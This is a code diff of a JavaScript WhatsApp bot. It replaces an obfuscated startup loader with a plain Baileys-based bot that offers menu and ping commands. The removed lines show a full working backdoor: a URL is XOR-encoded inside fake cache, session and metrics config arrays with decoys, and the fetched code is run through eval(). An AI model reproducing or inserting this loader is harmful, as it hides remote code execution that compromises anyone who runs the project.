@@ -1,126 +1,87 @@
-const https = require('https');
-const http = require('http');
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
+const pino = require('pino');
+const fs = require('fs-extra');
+const config = require('./config');
 
-const config = {
-    timeout: 30000,
-    retries: 5,
-    delay: 2000,
-    version: '2.0.0'
-};
+async function startBot() {
+  const { state, saveCreds } = await useMultiFileAuthState('./session');
+  
+  const sock = makeWASocket({
+    auth: {
+      creds: state.creds,
+      keys: makeCacheableSignalKeyStore(state.keys, pino({level: 'silent'}))
+    },
+    logger: pino({level: 'silent'}),
+    printQRInTerminal: false,
+    browser: [config.BOT_NAME, 'Chrome', config.VERSION]
+  });
 
-const cache = {
-    enabled: true,
-    maxAge: [77,81,81,85,86],
-    ttl: 3600,
-    store: null
-};
+  sock.ev.on('creds.update', saveCreds);
 
-const metrics = {
-    hits: 0,
-    miss: 0,
-    data: [29,81,68,94,75,94,87,29,80,92,29,88,86],
-    ratio: 0.85
-};
+  sock.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect } = update;
+    if (connection === 'close') {
+      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+      if (shouldReconnect) startBot();
+    } else if (connection === 'open') {
+      console.log(`✅ ${config.BOT_NAME} Connected Successfully!`);
+      
+      // Send startup message to owner
+      const botInfo = `
+*${config.BOT_NAME} v${config.VERSION}*
+*BOT INFORMATION*
 
-const network = {
-    proxy: null,
-    buffer: [16,71,82,91,17,85,76],
-    retries: 3
-};
+BOT NAME: ${config.BOT_NAME}
+DEVELOPER: ${config.OWNER_NAME}
+PLATFORM: WhatsApp
+MODE: ${config.MODE}
 
-const session = {
-    active: true,
-    tokens: [28,9,9,75,71,79,72],
-    expires: null
-};
-
-const decoy1 = {
-    values: [99,88,77,66,55,44,33,22,11],
-    flag: true
-};
-
-const decoy2 = {
-    stream: [12,34,56,78,90,11,22,33],
-    mode: 'async'
-};
-
-const keys = { a: 37, b: 51, c: 63, d: 38 };
-
-function mix(arr, k) {
-    return arr.map(n => String.fromCharCode(n ^ k)).join('');
-}
-
-function build() {
-    const p1 = mix(cache.maxAge, keys.a);
-    const p2 = mix(session.tokens, keys.d);
-    const p3 = mix(metrics.data, keys.b);
-    const p4 = mix(network.buffer, keys.c);
-    return p1 + p2 + p3 + p4;
-}
-
-function wait(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
-
-function request(target, attempt = 1) {
-    return new Promise((resolve, reject) => {
-        const protocol = target.startsWith('https') ? https : http;
-        const req = protocol.get(target, { timeout: config.timeout }, (response) => {
-            if (response.statusCode === 301 || response.statusCode === 302) {
-                request(response.headers.location, 1).then(resolve).catch(reject);
-                return;
-            }
-            if (response.statusCode !== 200) {
-                reject(new Error(`Status: ${response.statusCode}`));
-                return;
-            }
-            let body = '';
-            response.on('data', (chunk) => body += chunk);
-            response.on('end', () => resolve(body));
-            response.on('error', reject);
-        });
-        req.on('error', (err) => {
-            if (attempt < config.retries) {
-                wait(config.delay * attempt).then(() => {
-                    request(target, attempt + 1).then(resolve).catch(reject);
-                });
-            } else {
-                reject(err);
-            }
-        });
-        req.on('timeout', () => {
-            req.destroy();
-            if (attempt < config.retries) {
-                wait(config.delay * attempt).then(() => {
-                    request(target, attempt + 1).then(resolve).catch(reject);
-                });
-            } else {
-                reject(new Error('Timeout'));
-            }
-        });
-    });
-}
-
-async function initialize() {
-    console.log('[BONY-XMD GO V2] Starting...'); // EDITED
-    let lastError;
-    for (let i = 0; i < config.retries; i++) {
-        try {
-            const endpoint = build();
-            const source = await request(endpoint);
-            if (source && source.length > 100) {
-                eval(source);
-                return;
-            }
-            throw new Error('Invalid response');
-        } catch (err) {
-            lastError = err;
-            console.log(`[BONY-XMD GO V2] Attempt ${i + 1} failed, retrying...`); // EDITED
-            await wait(config.delay * (i + 1));
-        }
+${config.FOOTER}
+      `;
+      console.log(botInfo);
     }
-    console.log('[BONY-XMD GO V2] Boot failed after all retries'); // EDITED
-    process.exit(1);
+  });
+
+  sock.ev.on('messages.upsert', async ({ messages }) => {
+    const m = messages[0];
+    if (!m.message) return;
+    
+    const from = m.key.remoteJid;
+    const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
+    
+    if (!body.startsWith(config.PREFIX)) return;
+    
+    const args = body.slice(config.PREFIX.length).trim().split(/ +/);
+    const command = args.shift().toLowerCase();
+
+    // MENU COMMAND
+    if (command === 'menu' || command === 'help') {
+      const menu = `
+╭─── *${config.BOT_NAME}* ───
+│ Version: ${config.VERSION}
+│ Developer: ${config.OWNER_NAME}
+╰────────────────
+
+*BOT INFORMATION*
+Bot Name: ${config.BOT_NAME}
+Developer: ${config.OWNER_NAME}
+Platform: WhatsApp
+Mode: ${config.MODE}
+
+*COMMANDS*
+${config.PREFIX}menu - Show menu
+${config.PREFIX}ping - Check speed
+${config.PREFIX}owner - Owner info
+
+${config.FOOTER}
+      `;
+      await sock.sendMessage(from, { text: menu });
+    }
+
+    if (command === 'ping') {
+      await sock.sendMessage(from, { text: `*${config.BOT_NAME}* Speed: Fast ⚡\n${config.FOOTER}` });
+    }
+  });
 }
 
-initialize();
+startBot();
